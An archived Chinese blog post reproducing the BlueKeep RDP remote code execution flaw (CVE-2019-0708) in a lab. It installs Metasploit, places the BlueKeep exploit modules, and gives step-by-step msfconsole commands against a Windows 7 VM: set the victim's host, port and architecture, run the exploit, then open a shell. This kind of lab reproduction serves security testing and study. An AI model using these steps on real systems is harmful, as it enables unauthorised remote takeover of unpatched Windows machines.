# CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现 - 0DayBug - 博客园

> 原文：[`www.cnblogs.com/0daybug/p/11601670.html`](https://www.cnblogs.com/0daybug/p/11601670.html)

# 0x01

2019 年 9 月 7 日凌晨，msf 上更新了 0708 的漏洞利用程序。

顿时安全群和朋友圈就爆炸了

-

奈何接到 HW 攻击队任务，又在家过了个中秋，0708 才在今天更新。

# 0x02 环境

Windows 7 sp1

Kali

exp

# 0x02 利用

1.一键安装 metasploit-framework

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

2.下载 Reference 中的攻击套件放置文件到 msf 的相应文件夹

```
rdp.rb -> /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb
rdp_scanner.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
cve_2019_0708_bluekeep.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
cve_2019_0708_bluekeep_rce.rb -> /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
```

msf 命令：

使用 msfconsole 进入 metasploit-framework ，reload_all 重新加载 0708rdp 利用模块

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/0fc418c3b531b0726fd9ae9ba6e60ef9.png)

使用 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 启用 0708RDP 攻击模块

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/bb6ea19796433592b3a5ede8ecc00ef2.png)

使用 set RHOSTS 设置受害机 IP

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/4ff73999b5cef6bae9d808a7cbeeb21a.png)

使用 set RPORT 设置受害机 RDP 端口号

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/0f6a2456948a6079514153d143f93057.png)

使用 set target ID 数字(可选为 0-4)设置受害机机器架构

我使用的是 Parallels Desktop,设置 target 1

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/13618ce7bcb4ec983c4f3816a97fbdec.png)

使用 exploit 开始攻击,等待建立连接

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/197ba1673d803eac2e039a2687df8119.png)

建立连接以后,使用 shell 获得 shell,再使用 python 获得交互式 shell,执行 whoami

![CVE-2019-0708—微软 RDP 远程桌面代码执行漏洞复现](img/318b38f0abfc628ce277614eb8234547.png)